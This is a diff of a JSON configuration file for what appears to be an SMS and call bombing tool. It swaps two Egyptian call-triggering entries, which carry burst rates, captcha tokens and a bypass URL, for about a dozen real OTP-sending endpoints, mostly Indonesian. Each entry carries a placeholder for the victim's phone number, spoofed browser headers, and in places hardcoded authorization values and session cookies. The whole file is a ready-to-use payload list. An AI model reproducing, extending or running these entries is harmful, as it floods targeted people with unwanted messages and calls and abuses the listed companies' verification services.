@@ -1,86 +1,168 @@
 [
-  {
-    "workerName": "YallaMotor",
-    "workerMode": "CALL",
-    "workerType": "GET",
-    "workerDPC": "60",
-    "workerDPB": "600",
-    "burst": "5",
-    "workerMax": "500",
-    "workerURL": "https://egypt.yallamotor.com/verify-twilio/911959",
-    "workerBypassMethod": "none",
-    "workerStatus": "100",
-    "workerIsActive": "False",
-    
-    "workerPrefix": "",
-    "workerHeader": {
-      "User-Agent": "#userAgent",
-      "Accept": "application/json, text/plain, */*",
-      "Accept-Language": "en-US,en;q=0.5",
-      "Accept-Encoding": "gzip, deflate",
-      "Connection": "keep-alive",
-      "Sec-Fetch-Dest": "empty",
-      "Sec-Fetch-Mode": "no-cors",
-      "Sec-Fetch-Site": "same-site",
-      "TE": "trailers",
-      "Content-Type": "application/json;charset=utf-8",
-      "Authorization": "Bearer true",
-      "Pragma": "no-cache",
-      "Cache-Control": "no-cache"
+    {
+        "name": "Klikwa",
+        "method": "post",
+        "url": "https://api.klikwa.net/v1/number/sendotp",
+        "data": "{\"number\": \"+62{nomor}\"}",
+        "headers": {
+            "user-agent": "Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
+            "Authorization": "Basic QjMzOkZSMzM="
+        }
     },
-    "workerParameters": {
-      "phone": "#target",
-      "channeltype": "call",
-      "locale": "en",
-      "_": "1670163984304"
+    {
+        "name": "Payfazz",
+        "method": "post",
+        "url": "https://api.payfazz.com/v2/phoneVerifications",
+        "data": "{\"phone\": \"0{nomor}\"}",
+        "headers": {
+            "Host": "api.payfazz.com",
+            "content-length": "17",
+            "accept": "*/*",
+            "origin": "https://www.payfazz.com",
+            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",
+            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "referer": "http://www.payfazz.com/register/BEN6ZF74XL",
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+        }
     },
-    "workerSuccessText": {
-      "status_code": "200",
-      "status_text": "You will receive an automatic call"
+    {
+        "name": "SecuredAPI",
+        "method": "post",
+        "url": "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={nomor}",
+        "data": "",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.3",
+            "Accept-Encoding": "none",
+            "Accept-Language": "en-US,en;q=0.8",
+            "Connection": "keep-alive"
+        }
     },
-    "google_token" : "0",
-    "seleniumBypass" : "0"
-  },
-  {
-    "workerName": "Dubizzle",
-    "workerMode": "CALL",
-    "workerType": "POST",
-    "workerDPC": "1",
-    "workerDPB": "5",
-    "burst": "1",
-    "workerMax": "10",
-    "workerURL": "https://auth.dubizzle.com.eg/auth/realms/olx-eg/passwordless-login/phone-number/generate-challenge",
-    "workerBypassMethod": "",
-    "workerStatus": "100",
-    "workerIsActive": "True",
-    "workerPrefix": "+2",
-    "workerHeader": {
-      "Host":"auth.dubizzle.com.eg",
-      "Sec-Ch-Ua": "",
-      "Accept":"application/json",
-      "Content-Type":"application/json",
-      "Sec-Ch-Ua-Mobile":"?0",
-      "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
-      "Sec-Ch-Ua-Platform":"",
-      "Origin":"https://www.dubizzle.com.eg",
-      "Sec-Fetch-Site":"same-site",
-      "Sec-Fetch-Mode":"cors",
-      "Sec-Fetch-Dest":"empty",
-      "Referer":"https://www.dubizzle.com.eg/",
-      "Accept-Encoding":"gzip, deflate",
-      "Accept-Language":"en-US,en;q=0.9"
+    {
+        "name": "Matahari",
+        "method": "post",
+        "url": "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp",
+        "data": "{\"otp_request\":{\"mobile_number\":\"{nomor}\",\"mobile_country_code\":\"+62\"}}",
+        "headers": {
+            "Host": "www.matahari.com",
+            "content-length": "76",
+            "x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
+            "sec-ch-ua-mobile": "?1",
+            "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
+            "content-type": "application/json",
+            "accept": "*/*",
+            "x-requested-with": "XMLHttpRequest",
+            "sec-ch-ua-platform": "Android",
+            "origin": "https://www.matahari.com",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": "https://www.matahari.com/customer/account/create/",
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+        }
     },
-    "workerParameters": {
-      "client_id":"frontend",
-      "medium":"call",
-      "phone_number":"#target",
-      "captcha":"#captchaToken"
+    {
+        "name": "Battlefront",
+        "method": "post",
+        "url": "https://battlefront.danacepat.com/v1/auth/common/phone/send-code",
+        "data": "{\"mobile_no\": \"{nomor}\"}",
+        "headers": {
+            "user-agent": "Android/9;vivo/vivo 1902;KtaKilat/3.7.5;Device/;Android_ID/590bc36d99d6dddb;Channel/google_play;Ga_ID/bce68810-4f8a-4675-9452-e0d8565c9a50"
+        }
     },
-    "workerSuccessText": {
-      "status_code": "200",
-      "status_text": "Token"
+    {
+        "name": "Pinjamindo",
+        "method": "get",
+        "url": "https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=62{nomor}&af_id=1603255661130-6766273395770306663&app=pinjamindo&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=eEARw8yXQImtIANt3oU0zh&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10011&sign=46565D573B5BB08099A60A3414F265550092E215",
+        "data": "",
+        "headers": {}
     },
-    "google_token" : "6LdijU4iAAAAAPS5LzPDrsUYaessDfxTIPLzqRDh",
-    "seleniumBypass" : "https://www.dubizzle.com.eg/.humbucker/challenge/js/validate"
-  }
+    {
+        "name": "Jumpstart",
+        "method": "post",
+        "url": "https://api.jumpstart.id/graphql",
+        "data": "{\"operationName\": \"CheckPhoneNoAndGenerateOtpIfNotExist\", \"variables\": {\"phoneNo\": \"+62{nomor}\"}, \"query\": \"query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) {\\n  checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo)\\n}\\n\"}",
+        "headers": {
+            "user-agent": "Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
+            "content-type": "application/json"
+        }
+    },
+    {
+        "name": "Asani",
+        "method": "post",
+        "url": "https://api.asani.co.id/api/v1/send-otp",
+        "data": "{\"phone\": \"62{nomor}\", \"email\": \"akuntesnuyul@gmail.com\"}",
+        "headers": {
+            "user-agent": "Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36"
+        }
+    },
+    {
+        "name": "Depop_from30",
+        "method": "put",
+        "url": "https://webapi.depop.com/api/auth/v1/verify/phone",
+        "data": "{\"phone_number\": \"{nomor}\", \"country_code\": \"ID\"}",
+        "headers": {
+            "Host": "webapi.depop.com",
+            "accept": "application/json, text/plain, */*",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
+            "Content-Type": "application/json",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+        }
+    },
+    {
+        "name": "Indo_from30",
+        "method": "get",
+        "url": "https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP={nomor}",
+        "data": "",
+        "headers": {
+            "Host": "account-api-v1.klikindomaret.com",
+            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
+            "content-type": "application/json",
+            "accept": "*/*",
+            "origin": "https://account.klikindomaret.com",
+            "referer": "https://account.klikindomaret.com/SMSVerification?nohp=target_number&type=register",
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+        }
+    },
+    {
+        "name": "Wa2_from30",
+        "method": "post",
+        "url": "https://qtva.id/page/frames.php?f=eVBDUVU0NE1DTStQTmgvallDaTA0QT09&p=RUtYZFBydUdXTmVWMUtnc3M1ZmtnVFpMSXRxTWlvQUduaTR6VFZzRk00UT0=&hc=bmFSencyM2FmUWxmckV4Y0pXdEVOQ1pYZW5pY0pXSlBENHZSaCtJNmtTSnR0SHJWeEJaOUhWZHVSUHpRcXhWTg==",
+        "data": "{\"namaDepan\": \"Tahalu_random\", \"emailNope\": \"{nomor}\", \"password\": \"Indo_random\", \"konfirmasiPass\": \"Indo_random\"}",
+        "headers": {
+            "Host": "qtva.id",
+            "Connection": "keep-alive",
+            "Accept": "text/html, */*; q=0.01",
+            "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Origin": "https://qtva.id",
+            "Referer": "https://qtva.id/page/register/siswa",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+            "Cookie": "PHPSESSID=7pf5ve6qvjlaeq8lv6ce91mbr4; AWSELB=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; AWSELBCORS=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; _ga=GA1.2.232839318.1597753085; _gid=GA1.2.158794496.1597753085; _gat=1"
+        }
+    },
+    {
+        "name": "Icq_300xend",
+        "method": "post",
+        "url": "https://u.icq.net/api/v14/rapi/auth/sendCode",
+        "data": "{\"reqId\": \"64708-1593781791\", \"params\": {\"phone\": \"{nomor}\", \"language\": \"en-US\", \"route\": \"sms\", \"devId\": \"ic1rtwz1s1Hj1O0r\", \"application\": \"icq\"}}",
+        "headers": {
+            "accept": "*/*",
+            "accept-language": "en-US,en;q=0.9,id;q=0.8,mt;q=0.7",
+            "content-type": "application/json",
+            "origin": "http://web.icq.com",
+            "referer": "http://web.icq.com/",
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "cross-site",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"
+        }
+    }
 ]
